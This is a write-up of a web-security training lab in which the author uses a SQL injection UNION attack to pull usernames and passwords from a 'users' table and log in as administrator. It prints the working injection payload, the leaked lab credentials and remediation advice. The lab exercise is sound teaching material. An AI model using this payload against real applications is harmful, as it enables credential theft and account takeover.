# Lab: SQL injection UNION attack, retrieving data from other tables

**Category:** SQL Injection
**Difficulty:** Practitioner
**Objective:** Use a UNION attack to retrieve usernames and passwords from the `users` table, then log in as the administrator

## 0. Attacker mindset

I know the database contains a table called `users` with columns `username` and `password`. The goal is to append these two values to the product listing using a UNION injection. Since the original query likely returns more than two columns, I need to place the data into the string-compatible columns I identified earlier. No concatenation was needed here because both `username` and `password` fit directly into the two string columns of the original query.

## 1. What is the vulnerability?

The product category filter concatenates user input directly into a SQL `SELECT` statement. By injecting a `UNION SELECT` that pulls from the `users` table, an attacker can expose the credentials of all application users in the HTML response.

## 2. How did I exploit it?

1. Intercepted the category filter request in Burp Suite (`GET /filter?category=...`) and sent it to Repeater
2. Modified the `category` parameter to inject a `UNION SELECT` targeting the provided table and columns:
```
'UNION+SELECT+username,password+FROM+users--
```
3. Sent the modified request. The application returned an HTTP 200 response with the extracted credentials rendered directly in the product table:

```html
<tr><th>administrator</th><td>i1d1vlep16nwrx7gd4n5</td></tr>
<tr><th>wiener</th><td>0t4aa392d80f5xk8lg6m</td></tr>
<tr><th>carlos</th><td>iz71rtbv4g4e2jpjc65w</td></tr>
```
4. Copied the `administrator` password (`i1d1vlep16nwrx7gd4n5`)
5. Navigated to `/my-account` and logged in with:
    - `administrator`:`i1d1vlep16nwrx7gd4n5`
6. Lab solved

## 3. Impact

- **Direct credential theft:** Extraction of plaintext usernames and passwords from the database
- **Authentication bypass:** Immediate account takeover, including full administrative access
- **Proof of critical data exposure:** Demonstrates that unsanitized input combined with visible query results enables unrestricted read access to sensitive tables
- **Escalation vector:** Compromised admin credentials can be leveraged for further attacks (data exfiltration, configuration changes, lateral movement)

## 4. How can it be fixed?

- Use parameterized queries (prepared statements) for all database access
- Do not mix user input with SQL code
- Hash and salt passwords so that even if the database is breached, the plaintext values are not immediately usable
- Enforce the principle of least privilege on the database account used by the web application

---

**MITRE ATT&CK:** [T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)

**CWE:** (CWE-89: SQL Injection)[https://cwe.mitre.org/data/definitions/89.html?spm=a2ty_o01.29997173.0.0.7fb355fbnAbzwI]

**CAPEC:** (CAPEC-66: SQL Injection)[https://capec.mitre.org/data/definitions/66.html?spm=a2ty_o01.29997173.0.0.7fb355fbnAbzwI]

**OWASP:** (A05:2025 Injection)[https://owasp.org/Top10/2025/A05_2025-Injection/?spm=a2ty_o01.29997173.0.0.7fb355fbnAbzwI]

**EMB3D TID-320:** (TID-320: SQL Injection)[https://emb3d.mitre.org/threats/TID-320.html?spm=a2ty_o01.29997173.0.0.7fb355fbnAbzwI]